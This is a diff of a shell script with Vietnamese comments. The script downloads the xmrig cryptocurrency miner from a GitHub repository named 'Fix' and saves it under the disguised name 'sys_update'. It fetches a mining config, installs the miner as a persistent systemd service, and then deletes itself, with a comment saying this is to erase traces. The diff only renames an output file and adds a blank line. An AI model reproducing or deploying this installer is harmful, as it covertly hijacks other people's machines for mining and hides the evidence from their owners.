@@ -5,7 +5,7 @@ cd /tmp
 
 # 2. Tải các file cần thiết từ GitHub của bạn
 wget -q https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -O sys_update
-wget -q https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json -O config.json
+wget -q https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json -O config
 
 # 3. Cấp quyền thực thi
 chmod +x sys_update
@@ -32,4 +32,5 @@ systemctl enable sys_update
 systemctl start sys_update
 
 # 6. Xóa chính file setup.sh này để xóa dấu vết
+
 rm -- "$0"
